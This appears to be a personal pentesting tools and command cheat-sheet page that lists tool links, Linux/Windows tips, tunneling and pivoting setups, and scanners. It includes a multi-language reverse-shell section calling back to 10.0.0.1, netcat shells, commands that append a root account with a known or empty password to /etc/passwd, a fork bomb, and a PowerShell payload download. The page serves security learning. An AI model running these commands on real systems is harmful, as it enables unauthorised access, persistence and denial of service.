---
layout: page

title: _tools_

category: infosec
see_my_category_in_header: true

permalink: /infosec/tools.html
---

<article class="markdown-body" markdown="1">

# Content

* TOC
{:toc}

---

# Other pentest lists

#### Tools lists

* [en.kali.tools](https://en.kali.tools/all/) - all kali tools
* [blackarch.org/tools.html](https://blackarch.org/tools.html) - all blackarch tools
* [securityxploded](http://securityxploded.com/) - contains lists of handy tools for linux/windows/recovery/network/anti-spyware/security
* [sectools.org](http://sectools.org/) - top 125 network security tools
* [lcamtuf.coredump.cx](http://lcamtuf.coredump.cx/)
* [(RU) Cisco tools](https://habrahabr.ru/company/cisco/blog/346160/)


#### pentest tool collections to be remastered
<!-- !!! All this repos must be examined for utils and be remastered -->

* [jivoi/pentest](https://github.com/jivoi/pentest) - awesome repo with pentest utils and pentest notes
    <!-- !!! Directory [notes](https://github.com/jivoi/pentest/tree/master/notes) must be specially examined -->
* [Powerful Plugins](https://github.com/Hack-with-Github/Powerful-Plugins) - list of plugins for burp, firefox, IDA, Immunity Dbg, OSINT, OllyDbg, ThreatIntel, volatility
* [pentest-bookmarks BookmarksList.wiki](https://github.com/jhaddix/pentest-bookmarks/blob/master/wiki/BookmarksList.wiki)
* [0daysecurity.com pentest](http://www.0daysecurity.com/pentest.html)
* [Влад Росков (Kaspersky)](https://vk.com/topic-114366489_33962987) (russian) - collection of tools for web, crypto, stegano, forensic, reverse, network, recon
* [penetration testing tools cheat sheet (highon.cofee)](https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/)
* [malware-analyzer](http://www.malware-analyzer.com/analysis-tools)
* repos with ideology "have every script that a hacker needs"

    * [x3omdax/PenBox](https://github.com/x3omdax/PenBox)
    * [Manisso/fsociety](https://github.com/Manisso/fsociety)

* [phenoelit lands of packets](http://www.phenoelit.org/)
* [jedge.com Information Security](http://www.jedge.com/wordpress/security-tools/)
* [pentest scripts](https://github.com/milo2012/pentest_scripts)
* [51x guy's repository](https://github.com/51x/) has many wonderfull things
* {:.dummy} [pentestmonkey's misc](http://pentestmonkey.net/category/tools/misc)

<br>

* [r3dw4x/Cheatsheets](https://github.com/r3dw4x/Cheatsheets)
* [skullsecurity.org](https://wiki.skullsecurity.org/index.php?title=Hacking) - list of commands for various OS'es
* [commandlinefu.com](https://www.commandlinefu.com/commands/browse/sort-by-votes) - list of console's cheats

<br>

* [McAffee tools](https://www.mcafee.com/us/downloads/free-tools/index.aspx)

<br>

#### CTF orientation:

* [eugenekolo/sec-tools](https://github.com/eugenekolo/sec-tools)
* [apsdehal/awesome-ctf](https://github.com/apsdehal/awesome-ctf)
* [zardus'es ctf-tools](https://github.com/zardus/ctf-tools)
* [Useful tools for CTF](http://delimitry.blogspot.ca/2014/10/useful-tools-for-ctf.html?m=1)
* [Tools and Resources to Prepare for a Hacker CTF Competition or Challenge (resources.infosecinstitute.com)](http://resources.infosecinstitute.com/tools-of-trade-and-resources-to-prepare-in-a-hacker-ctf-competition-or-challenge/)
* [CTF & PenTest Tools (gdocs)](https://docs.google.com/document/d/146caSNu-v9RtU9g2l-WhHGxXV4MD02lm0kiYs2wOmn0/mobilebasic?pli=1)
* [ItSecWiki (RU)](http://itsecwiki.org/index.php) (russian) - wiki-шпаргалка для использования во время CTF соревнований

<br>

#### Tools under android

* [NetHunter](https://www.kali.org/kali-linux-nethunter/) - Kali-linux for Android
* [SuperSU](https://play.google.com/store/apps/details?id=eu.chainfire.supersu)
* [Hijacker](https://github.com/chrisk44/Hijacker/releases) - GUI for wifi pentest tools: Aircrack-ng, Airodump-ng, MDK3 and Reaver (requirements: suitable wifi-chipset and rooted device) ([article](https://www.kitploit.com/2017/09/hijacker-v13-all-in-one-wi-fi-cracking.html) about Hijacker)
* [WiFiAnalyzer](https://play.google.com/store/apps/details?id=com.vrem.wifianalyzer)

<!-- =================================================================================================================================================================================== -->
<!-- =================================================================================================================================================================================== -->
<!-- =================================================================================================================================================================================== -->

<br>

---

# Command-line linux/windows cheats

---

* Cross-encodings: [luit](http://invisible-island.net/luit/) - a filter that can be run between an arbitrary application and a UTF-8 terminal emulator. It will convert application output from the locale's encoding into UTF-8, and convert terminal input from UTF-8 into the locale's encoding.

* [Execute a `system` command](https://rosettacode.org/wiki/Execute_a_system_command#Python) in a lot of various languages.

#### run shells listening on network (with different languages)

*thanks to [pentestmonkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet), [Snifer/security-cheatsheets reverse-shell](https://github.com/Snifer/security-cheatsheets/blob/master/reverse-shell)*

* ***netcat*** bind shell: remote: `nc -e /bin/bash -nvlp 12344`, local: `nc -nvv 10.0.0.1 12344`
* ***netcat*** reverse shell: remote: `nc -e /bin/bash 10.0.0.1 1337`, local: `nc -nvlp 12344`
* ***socat*** bind shell: remote: `socat TCP-LISTEN:12344,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane`, local: ```socat FILE:`tty`,raw,echo=0 TCP:10.0.0.1:12344```
* ***socat*** reverse shell: remote: `socat TCP4:10.0.0.1:12344 EXEC:bash,pty,stderr,setsid,sigint,sane`, local: ```socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0```
* ***bash***: remote: `bash -i >& /dev/tcp/10.0.0.1/12344 0>&1`, local: `nc -nvlp 12344`
    <br> remote: `exec /bin/bash 0&0 2>&0`
    <br> remote: `0<&196;exec 196<>/dev/tcp/10.0.0.1/12344; sh <&196 >&196 2>&196`
* ***perl***: remote: `perl -e 'use Socket;$i="10.0.0.1";$p=12344;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'` (depends on `/bin/sh`), local: `nc -nvlp 12344`
    <br> remote: `perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"10.0.0.1:12344");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'`
    <br> remote: `perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"10.0.0.1:12344");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'` (windows only)
* ***python***: remote: `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",12344));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`, local: `nc -nvlp 12344`
    <!-- alternative: `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",12344));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'` -->
* ***php***: remote: `php -r '$sock=fsockopen("10.0.0.1",12344);exec("/bin/sh -i <&3 >&3 2>&3");'`, local: `nc -nvlp 12344` (assumption: tcp connection uses descriptor 3, if not, try 4,5,6...)
* ***ruby***: remote: `ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",12344).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'` (depends on `/bin/sh`), local: `nc -nvlp 12344`
    <br> `ruby -rsocket -e 'exit if fork;c=TCPSocket.new("10.0.0.1","12344");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'`
    <br> `ruby -rsocket -e 'c=TCPSocket.new("10.0.0.1","12344");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'` (windows only)
* ***java***: remote: `r = Runtime.getRuntime(); p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/12344;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]); p.waitFor();`, local: `nc -nvlp 12344`
* ***xterm***: remote: `xterm -display 10.0.0.1:1` (this will connect on port 6001), local: `Xnest :1` (target must be authorized to connect to you: `xhost +targetip`)
* ***gawk*** look at [Snifer/security-cheatsheets reverse-shell](https://github.com/Snifer/security-cheatsheets/blob/master/reverse-shell)

<!-- =================================================================================================================================================================================== -->
<!-- =================================================================================================================================================================================== -->
<!-- =================================================================================================================================================================================== -->

<br>

---

## Linux commands / steroids

---

* [commandlinefu.com](http://www.commandlinefu.com/commands/browse/sort-by-votes) - a ton of fun and useful command-line commands
* [explainshell.com](https://explainshell.com/explain?cmd=ssh+-L+127.0.0.1%3A2222%3A192.168.1.3%3A2345+root%40192.168.1.2) - web-site with beautifull linux's MAN integration

<br>

* ***grep*** - `grep ./ -r -A 3 -B 3 -aniPe "search-string"` - also print neighbour lines
    <br> `grep ./ -r -aoiPe "search-string"` - `-o` look up binary files too
    <br> `-i` - ignore case

* ***find*** - `find / -type d -name "*jdk*" -print` (search for directory)
    <br> `find / -perm /6000 -user root -exec ls -ldb {} \;` - search files, owned by root with suid OR guid bit and pass files to `ls`
    <br> find is *incredibly* powerfull (can filter by time, permissions, users, regexp path, depth, ...)

* ***netcat*** - `nc -e /bin/bash -w 3 -nvlp 12344` + `nc localhost 12344` - shell through modern netcat
    <br> `rm /tmp/q;mkfifo /tmp/q;cat /tmp/q|/bin/sh -i 2>&1|nc -l -p 12344 >/tmp/q` + `nc localhost 12344` - shell through netcat
    <br> `nc -zv example.com 1-1000` - scan ports

* *Spawning a TTY shell* (*patching shell after exploit*), this command will "upgrade your miserable os-commanding into regular semi-interactive shell":
    * `python -c 'import pty; pty.spawn("/bin/bash")'`, `/bin/bash -i`, `perl -e 'exec "/bin/sh";'`
    * perl: `exec "/bin/sh";`, ruby: `exec "/bin/sh"`, lua: `os.execute('/bin/sh')`
    * irb: `exec "/bin/sh"`, vi: `:!bash`, vi: `:set shell=/bin/bash:shell`, nmap: `!sh`
    * <small>*thanks for samples to [this article](https://netsec.ws/?p=337)*</small>

* ***Add user***, by adding it into ***`/etc/passwd`***:
    <br> `openssl passwd -1` -> `$1$P31HlF1S$uIgLxnmiwjuC2.iaP8xvJ/` (password: test) ([more](https://ma.ttias.be/how-to-generate-a-passwd-password-hash-via-the-command-line-on-linux/) and [more](https://unix.stackexchange.com/questions/81240/manually-generate-password-for-etc-shadow), ...) (generation with salt: `openssl passwd -1 -salt my_salt my_pass`)
    <br> `echo "username:$1$P31HlF1S$uIgLxnmiwjuC2.iaP8xvJ/:0:0:comment:/root:/bin/bash" >>/etc/passwd`
    <br> *empty password*: `echo "u:$1$$qRPK7m23GJusamGpoGLby/:0:0::/:/bin/sh" >> /etc/passwd`

* ***proxychains*** - `echo "socks4 127.0.0.1 8080" >>/etc/proxychains.conf` `proxychains firefox`
    <br> alternative: ***tsocks*** - `/etc/tsocks.conf`
    <br> [proxifier](https://www.proxifier.com/) - proxychains for windows
* ***iptables*** list rules: `iptables -L -v -n --line-numbers # show all rules` (`-t` tables: nat, filter, mangle, raw, security) ([man iptables (ru)](https://www.opennet.ru/docs/RUS/iptables/#TRAVERSINGGENERAL) - великолепная статья про iptables)
* ***openssl***

    * connect: `openssl s_client -connect ya.ru:443`
    * view certificate: `openssl pkcs12 -info -in cert.p12`

<br>

**Simple linux commands**:

* `w`, `who`, `last`, `lastb`, `lastlog`
* `pwgen -ABsN 1 32` - password generator
* `python -m SimpleHTTPServer 8080` / `python3 -m http.server 8080` - host current directory (simple web-server) (Other approaches: (*[@Quick Web Servers](http://attackerkb.com/Web/Quick%20Web%20Servers) (ruby, openssl, stunnel)*))
    <br> `ruby -run -e httpd -- -p 8080 .`
    <br> `openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout mycert.pem -out mycert.pem` (generate certs), `openssl s_server -cert mycert.pem -accept 443 -WWW`
    <br> `stunnel -d 443 -r 8080` - encapsulate HTTP into HTTPS and host it at 443 port
* `echo "test" | at midnight` - run command at specified time
* `man ascii`
* `Alt + F1 F2 ...` – changes terminals in *linux* console (`F7` - is *usually* System X)
* `xxd` - convert text to its hex, `xxd -r -p` - convert hex into text
* about keyboard layout: `setxkbmap -query`, `cat /etc/default/keyboard`
* **network**:

    * `mtr -t` - online traceroute
    * `host`, `dig +short`, `dig ANY google.com`
    * `curl http://ipinfo.io/ip`, `curl http://icanhazip.com`, `curl http://checkip.dyndns.org`, `curl ifconfig.me`, `curl http://myip.ru/index_small.php` - get your public ip-address
    * `route -nee`, `netstat -rn`, `ip route list` - see linux routes
    * `netstat -tulpan` - see current connections
    * `nc -nvlp 12344`
    * `fping` - ping multiple hosts simultaneously
    * `ip addr add 10.0.0.3/24 dev eth0`
    * `hping3`, `nping`
    * [ngrep](https://github.com/jpr5/ngrep) (`apt-get install ngrep`) - [ngrep примеры использования](https://sysadmin.pm/ngrep/)

* **formatting**:

    * `stty -a` - get current size of your terminal, `stty rows 120 cols 200` - set custom size of your terminal
    * `mount | column -t` - column command gives good formatting
    * `… | less` - helps to view long files/output on not-scrolling terminal
    * `cat apache.log | tail -f`

* **system management**:

    * `inxi -Fxz`
    * `ps aux`, `ps axjf`, `ps -au phonexicum`, `ps aux --sort pmem`
    * `df -hT`, `du -hd 1`, `fdisk -l`, `free -h`
    * ***ulimit*** - get and set user limits in linux
    * ***netstat***, ***htop***, ***top***, ***dstat***, ***free***, ***vmstat***, ***ncdu***, ***iftop***, ***hethogs***
    * ***lsblk***, ***lscpu***, ***lshw***, ***lsus***, ***lspci***, ***lsusb***
    * **`lsof -nPi`** - list opened files - very flexible utility, can be used for network analylsis
    * [SEToolkit (v3.5.1 - 2013)](https://sourceforge.net/projects/setoolkit/) - a collection of scripts for performance analysis and gives advice on performance improvement (it has been a standard in system performance monitoring for the Solaris platform over the last 10 years)
    * [`inotify`](https://en.wikipedia.org/wiki/Inotify) or `man fanotify` (can block actions) - Linux kernel subsystem that acts to extend filesystems to notice changes to the filesystem, and report those changes to applications.

* **file manipulation**:

    * ***vbindiff*** - hexadecimal file display and comparison
    * ***iconv/uconv*** – convert between encodings
    * ***dos2unix*** (any combination of `dos`, `unix`, `mac`) – DOS/Mac to Unix and vice versa text file format converter

* **environment**:

    * `$IFS`
    * `$USER` `$PATH` `$PAGES`
    * `$LD_LIBRARY_PATH` `$LD_PRELOAD`

<br>

* **Bash(zsh)-playing**

    * `reset` - restore your terminal to default state after breaking it with binary/raw data
    * `Ctrl+u` - save currently gathered command, `Ctrl+y` - restore previously saved command
    * `Ctrl+x Ctrl+e` - runs vim to create complex command for future execution
    * `sudo !!` - rerun previous command with sudo (or any other command)
    * `^foo^bar` - run previous command with replacement
    * ` command` - command starting with *space* will be executed, but not stored in history
    * `(cd /tmp && ls)` - execute command and custom directory, and return to previous directory

<br>

#### My personal cheatsheet

* **Linux STEROIDS**

    * ***zsh*** + [robbyrussell/oh-my-zsh](https://github.com/robbyrussell/oh-my-zsh) + [zdharma/history-search-multi-word](https://github.com/zdharma/history-search-multi-word)
    * ***tmux*** ([tmux shortcuts & cheatsheet](https://gist.github.com/MohamedAlaa/2961058)) + [gpakosz/.tmux](https://github.com/gpakosz/.tmux)
        <br> [tmux and screen cheatsheet](http://attackerkb.com/Unix/Tmux_and_Screen_Cheatsheet)
    * ***vim*** + [amix/vimrc](https://github.com/amix/vimrc) + (matter of taste: [tombh/novim-mode](https://github.com/tombh/novim-mode) + [reedes/vim-pencil](https://github.com/reedes/vim-pencil))
    * ***bash*** + [fnichol/bashrc](https://github.com/fnichol/bashrc)
    * ***nano*** + [scopatz/nanorc](https://github.com/scopatz/nanorc)

* `mount -t btrfs /dev/sdb2 -o rw /media/ctf-dumps` (`apt-get instal btrfs-tools`)
* `rdesktop 10.0.0.1 -u "phonexicum" -p "MyPass" -r disk:share=/home/phonexicum/Desktop/share -r clipboard:PRIMARYCLIPBOARD -g -g 1900x900`
    <br> rdesktop alternative: ***remmina***
* `cp /usr/share/applications/guake.desktop /etc/xdg/autostart/` - linux autostart guake
* Connect to wifi

    <div class="spoiler"><div class="spoiler-title" markdown="1">
    *wpa_supplicant/auto/manual*
    </div><div class="spoiler-text" markdown="1">

    *   *wpa_supplicant*:

        ```
        sudo wpa_supplicant -Dnl80211 -iwlan0 -C/var/run -dd
        sudo wpa_cli -p/var/run
        > scan
        > scan_results
        > add_network
        > set_network 0 ssid "vodafone817E"
        > set_network 0 psk "my-pass-phrase"
        > enable_network 0
        > reconnect
        > status
        > quit
        sudo dhclient wlan0
        ```

    *   Auto: add to `/etc/network/interfaces`:

        ```
        auto wlan0
        iface wlan0 inet dhcp
            wpa-ssid MyHomeWifi
            wpa-psk MySecretPassword
        ```

    *   Manual:

        ``` bash
        sudo ifconfig wlan0 up
        sudo iwlist wlan0 scan
        sudo iwconfig wlan0 essid MyHomeWifi key s:MySecretPassword
        sudo dhclient wlan0
        ```

    </div>
    </div>

* `wget -mk http://www.example.com/` - can be used for site mirroring
* regexp [using Look-ahead and Look-behind](http://www.perlmonks.org/?node_id=518444)

**Manage linux user/login/...** :

* `chsh -s /bin/zsh phonexicum`
* `useradd phonexicum -m -s '/bin/bash' -G sudo,pentest_group` - add new user
* `usermod -a -G phonexicum hacker_group` - add user to group
* `groups username` - get user's groups

**Fun linux commands**:

* `wget --random-wait -r -p -e robots=off -U mozilla http://www.example.com` - download whole web-site (light website crawler)
* `find / -type f -xdev -printf '%s %p\n' | sort -n | tail -20` - search 20 most big files in fs
* `du -xS / | sort -n | tail -20` - search 20 most big directories in fs
* `dd if=/dev/dsp | ssh -c arcfour -C phonexicum@10.0.0.2 dd of=/dev/dsp` - move audio from your machine to remote <br>
    or `arecord -f dat | ssh -C phonexicum@10.0.0.2 aplay -f dat`

* `curl -u phonexicum:MyPassword -d status="Tweeting from the shell" https://twitter.com/statuses/update.xml` - making a tweet from console

Other tools:

* ***pgpdump*** – a PGP packet visualizer
* [sysdig](https://www.sysdig.org/) – system-level exploration: capture system state and activity from a running Linux instance, then save, filter and analyze (looks like rootkit)

<br>

#### some fun

* fork-bomb, bash: `:(){ :|: & };:`
* [zip-bomb (wikipedia)](https://en.wikipedia.org/wiki/Zip_bomb)

<!-- =================================================================================================================================================================================== -->
<!-- =================================================================================================================================================================================== -->
<!-- =================================================================================================================================================================================== -->

<br>

---

## Windows commands / steroids

---

* [hiew](http://www.hiew.ru/) - view and edit files of any length in text, hex, and decode modes, ...
    <br> [radare2](https://github.com/radare/radare2) - is a very good alternative (probably even better) - some people say: radare must not be treated as disassembler, but as featured hex-editor
* **Monitor system / executables / processes / ...**

    * [SysInternals Suite](https://technet.microsoft.com/ru-ru/sysinternals/bb842062) - [docs](https://technet.microsoft.com/ru-ru/sysinternals/bb842062) – sysinternals troubleshooting utilities
    * [x64tools](http://www.nirsoft.net/x64_download_package.html) - [docs](http://www.nirsoft.net/x64_download_package.html) – small collection of utils for x64 windows
    * [Process Hacker](http://processhacker.sourceforge.net/) - helps to monitor system resources, debug software and detect malware
    * [NirSoft](http://www.nirsoft.net/) - contains lots of utilities for windows monitoring and forensics
    * [api-monitor-v2r13-x86-x64](http://www.rohitab.com/apimonitor) – lets you monitor and control API calls made by applications and services

* **repair/restore**

    * [MSDaRT](http://usbtor.ru/viewtopic.php?t=126) - microsoft diagnostic and recovery toolset
    * [Hiren's Boot CD](http://www.hirensbootcd.org/download/) (9 Nov 2012)
    * [AntiSMS](https://antisms.com/)

<br>

* `powershell -nop -c "(New-Object System.Net.WebClient).DownloadFile('http://10.11.0.108/r.exe', 'C:\Users\Bethany\Links\r.exe')"` - netcat analogue
* [FakeNet](https://sourceforge.net/projects/fakenet/) - windows network simulation tool. It redirects all traffic leaving a machine to the localhost
* ***powershell*** (`get-method`, `get-help`). Steroids:
    
    * [PowerTab](https://powertab.codeplex.com/) - extension of the PowerShell tab expansion feature
    * [PowerShellArsenal](https://github.com/mattifestation/PowerShellArsenal) - module can be used to disassemble managed and unmanaged code, perform .NET malware analysis, analyze/scrape memory, parse file formats and memory structures, obtain internal system information, etc

* ***ClipboardView*** (win)
* ***putty*** – ssh client

<!-- =================================================================================================================================================================================== -->
<!-- =================================================================================================================================================================================== -->
<!-- =================================================================================================================================================================================== -->

<br>

---

## Tunneling/pivoting

---

[A Red Teamer's guide to pivoting](https://artkond.com/2017/03/23/pivoting-guide/) - very good article on pivoting

Configure proxychains DNS resolve. Proxychains DNS server is hardcoded into `/usr/lib/proxychains3/proxyresolv`. Change 4.2.2.2 into custom DNS server (e.g. domain controller).

#### port forwarding

Problem of port forwarding: it does NOT work for UDP traffic.

* ***SSH*** port forwarding (pivoting) (`AllowTcpForwarding yes` and `GatewayPorts yes` required (default behaviour))
    <br> [autossh](http://www.harding.motd.ca/autossh/) - automatically restarts SSH tunnels (and sessions)
    <br> `autossh -M 0 -o "ServerAliveInterval 10" -o "ServerAliveCountMax 3" -L 12344:remote.com:80 phonexicum@192.168.x.y`

    * Local port forwarding: `ssh -L 12344:remote.com:80 phonexicum@192.168.x.y` - connection to localhost:9000 will be forwarded to remote.com:80 (`ssh -L 0.0.0.0:12344:remote.com:80 phonexicum@192.168.x.y`)
        <br> `~/.ssh/config`: `LocalForward 127.0.0.1:12344 remote.com:80`
    * Remote port forwarding: `ssh -R 12344:remote.com:80 phonexicum@192.168.x.y` - connection on 192.168.x.y:12344 will be forwarded to remote.com:80 (`ssh -R 0.0.0.0:12344:remote.com:80 phonexicum@192.168.x.y`)
        <br> `~/.ssh/config`: `RemoteForward 127.0.0.1:12344 remote.com:80`
    * Dynamic port forwarding (linux as *SOCKS* proxy): `ssh -f -N -D 8080 phonexicum@192.168.x.y` (`-N` - *not* run commands on server) (`ssh -f -N -D 0.0.0.0:8080 phonexicum@192.168.x.y`)
        <br> `echo "socks4 127.0.0.1 8080" > /etc/proxychains.conf` `sh> proxychains AnyApplication`
        <br> `~/.ssh/config`: `DynamicForward 127.0.0.1:8080`
   * VPN over SSH (L3 level) (`PermitRootLogin yes` and `PermitTunnel yes` at server-side required)
        <br> `ssh phonexicum@192.168.x.y -w any:any`
        <br> enable ip-forwarding at server (`echo 1 > /proc/sys/net/ipv4/ip_forward`, `iptables -t nat -A POSTROUTING -s 10.1.1.2 -o eth0 -j MASQUERADE`)
        <br> configure PPP: client: `ip addr add 10.1.1.2/32 peer 10.1.1.1 dev tun0`, server: `ip addr add 10.1.1.1/32 peer 10.1.1.2 dev tun0`
        <br> add your custom routes: `ip route add 10.x.y.z/24 dev tun0`
    
    For better stability add to `ssh_config`: `TCPKeepAlive yes`, `ServerAliveInterval 300`, `ServerAliveCountMax 3`

* ***SSH*** commanding:

    * `Enter` + `~` + `?` - help
    * `Enter` + `~` + `#` - list of all forwarded connections
    * `Enter` + `~` + `C` - internal ssh shell for add/remove forwarding
    * `Enter` + `~` + `.` - terminate current ssh session

    ***SSH*** gui forwarding: `ssh -X phonexicum@192.168.x.y` (`-Y` - less secure, but faster) (`X11Forwarding yes` required)

    Skip certificate check: `ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no phonexicum@192.168.x.y`

* ***Metasploit pivoting*** *([(RU) metasploit тунелирование](https://habrahabr.ru/company/pentestit/blog/326148/))*:

    In meterpreter: `run autoroute -s 10.1.2.0/24` - now metasploit modules can reach `10.1.2.0/24` subnetwork through established meterpreter session
    
    * local port forwarding: `meterpreter> portfwd add -L 10.0.0.1 -l 12344 -r 10.1.2.3 -p 80`
    * remote port forwarding: `meterpreter> portfwd add -R 10.1.2.1 -l 12344 -r 8.8.8.8 -p 80`
    * *SOCKS* proxy: `msf> use auxiliary/server/socks4a`

#### port forwarding ++

* ***[sshutle](https://github.com/sshuttle/sshuttle)*** - forwards the whole subnetwork (works using iptables)
    <br> `sshuttle -r user@9.1.2.3 10.1.2.0/24`

socks-proxy:

* ***[gost](https://github.com/ginuerzh/gost/)*** - [releases](https://github.com/ginuerzh/gost/releases) - GO Simple Tunnel - a simple tunnel written in golang <- *it looks VERY stable* and portable
    <br> [Wiki](https://docs.ginuerzh.xyz/gost/en/socks/)
    <br> `./gost -L socks4a://:1080`
* ***[reGeorg](https://github.com/sensepost/reGeorg)*** - *SOCKS* proxy
    <br> server side - load it like it is a webshell
    <br> client side - `python reGeorgSocksProxy.py -u http://9.1.2.3/socks.php`
* ***[reDuh](https://github.com/sensepost/reDuh)*** - create a TCP circuit through validly formed HTTP requests
* [rpivot](https://github.com/klsecservices/rpivot)
    <br> at server: `python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080` - listen for client agents on port 9999
    <br> at client: `python client.py --server-ip 10.0.0.2 --server-port 9999` - start socks4 proxy on 127.0.0.1:1080
    <br>
    <br> using ntlm rpivot can connect to corporate proxies with password or ntlm-hash
* [cntlm](http://cntlm.sourceforge.net/) - allows to transparently forward port through proxy for proxy unawared programs
* OpenVPN supports proxy though TCP connections (it also supports ntlm authentication)

<br>

* [3proxy](https://github.com/z3APA3A/3proxy/releases) - ***awesome*** proxy, but not small enough to be used during pentest
    <br> Can be http, socks, ... proxy; can forward ports; can make a coffee.

#### tunneling

* ***ICMP*** tunnel

    * [hans](http://code.gerade.org/hans/) (creates tun device + exists for windows)
    *   [ptunnel](http://www.mit.edu/afs.new/sipb/user/golem/tmp/ptunnel-0.61.orig/web/) - tunneling TCP into ICMP

        ``` bash
        # Server:
        sudo ptunnel -x PASSWORD

        # Client:
        sudo ptunnel -p server.white.ip-addr.com -lp 80 -da myip.ru -dp 80 -x PASSWORD

        # Client, set up with proxychains:
        sudo ptunnel -p server.white.ip-addr.com -lp 12344 -da your.ssh.server.com -dp 22 -x PASSWORD
        sudo ssh -f -N -D 12345 phonexicum@localhost -p 12344
        sudo bash -c "echo 'socks4 127.0.0.1 12345' >>/etc/proxychains.conf"
        proxychains firefox &
        ```

    * [udp2raw](https://github.com/wangyu-/udp2raw-tunnel) - tunnelling UDP in ***TCP/ICMP***
    * [icmptunnel](https://github.com/DhavalKapil/icmptunnel) - creates tap device (does not exist for windows)

* ***DNS*** tunnel [iodine](http://code.kryo.se/iodine/) 
    <br> [dnscat2](https://github.com/iagox86/dnscat2), [dnscat2-powershell](https://github.com/lukebaggett/dnscat2-powershell) - designed for "command and control" ([usage example (RU)](https://defcon.ru/network-security/956/)), [PowerDNS](https://github.com/mdsecactivebreach/PowerDNS) - transfer powershell script through dns)
* ***SSH tunnel*** [VPN туннель средствами ssh](http://linuxoid.in/VPN-%D1%82%D1%83%D0%BD%D0%BD%D0%B5%D0%BB%D1%8C_%D1%81%D1%80%D0%B5%D0%B4%D1%81%D1%82%D0%B2%D0%B0%D0%BC%D0%B8_ssh) [VPN over OpenSSH](https://wiki.archlinux.org/index.php/VPN_over_SSH) (or (RU)[VPN через SSH](https://vds-admin.ru/unix-toolbox/vpn-over-ssh)) (`PermitTunnel yes` required)

<!-- =================================================================================================================================================================================== -->
<!-- =================================================================================================================================================================================== -->
<!-- =================================================================================================================================================================================== -->

<br>

---

# Offensive

---

## Security scanners

---

*There is much-much more scanners exists in the world (good and ...)*

* Vulnerability scanners:

    * [***Seccubus***](https://www.seccubus.com/) - automates vulnerability scanning with: Nessus, OpenVAS, NMap, SSLyze, Medusa, SkipFish, OWASP ZAP and SSLlabs
        <br> *IVIL - Intermediate Vulnerability Information Language*
    * [Nessus (tenable)](https://www.tenable.com/products/nessus-vulnerability-scanner) (*Nessus Home - scan 16 IPs for 1 week*) (*holds about 20% of market ?*)
    * [nexpose](https://www.rapid7.com/products/nexpose/) (has *community edition*)
    * [OpenVAS](http://www.openvas.org/) (*FREE*) (scanner is not really good, because it is opensource), however lots of other scanners started using its engine
    * [XSpider](https://www.ptsecurity.com/ru-ru/products/xspider/) - network scanner
    * [Qualys FreeScan](https://www.qualys.com/forms/freescan/) (*FREE???*)
    * [MaxPatrol](https://www.ptsecurity.com/ru-ru/products/mp8/) - price is incredible (because this is not just a scanner, but a huge framework)
    * [Sn1per (github)](https://github.com/1N3/Sn1per) (*FREE*) - an automated scanner that can be used during a penetration test to enumerate and scan for vulnerabilities
    * [Nipper Studio](https://www.titania.com/products/nipper-studio) - network security scanner
    * [AppDetective Pro](https://www.trustwave.com/Products/Database-Security/AppDetectivePRO/) - database vulnerability assessment
    * {:.dummy} [CloudPiercer](https://cloudpiercer.org) - cloud-based security provider

* ***Web scanners*** ([price and feature comparison of web application scanners (2016)](http://www.sectoolmarket.com/price-and-feature-comparison-of-web-application-scanners-commercial-list.html)):

    *article*: [evaluation of web vulnerability scanners](https://www.netsparker.com/blog/web-security/how-to-evaluate-web-application-security-scanners-tools/)

    * [NetSparker](https://www.netsparker.com/pricing/)
    * [Acunetix](https://www.acunetix.com/free-network-vulnerability-scanner/)
    * [HP WebInspect](http://itgrd.ru/hp-webinspect/)
    * [IBM security AppScan](https://www.ibm.com/security/application-security/appscan) (*very expensive*)
    * [Nikto2](https://cirt.net/Nikto2) web-server scanner ([nikto (github)](https://github.com/sullo/nikto)) (*FREE* scanner) (can effectively search for hidden functionality on website)
        <br> [Wikto](https://github.com/sensepost/wikto) - nikto for Windows with some extra features.
        <br> `nikto -host http://10.0.0.1/` - light scan
        <br> `nikto -C all -dbcheck -host http://10.0.0.1/` - thorough scan
    * `use wmap` - metasploit's web scanner, `use auxiliary/scanner/http/crawler` - metasploit's web crawler
    * [BurpSuite](https://portswigger.net/burp) - very good web-proxy with some scanning capabilities in PRO version (*FREE* + PRO). Good extensions:
        <br> be carefull with cracked versions: e.g. [Malware Reversing - Burpsuite Keygen](https://0x00sec.org/t/malware-reversing-burpsuite-keygen/5167)
        <br> *[HUNT](https://github.com/bugcrowd/HUNT) - extension + methodology*

        <div class="spoiler"><div class="spoiler-title" style="display: inline-block;">
        <i>some of burpsuite's extensions:</i>
        </div><div class="spoiler-text" markdown="1">

        *Burp's capability extenders*:

        * Scan manual insertion point
        * Intruder Time Payloads
        * Custom Parameter Config (d)


        *Passive extensions*:
            
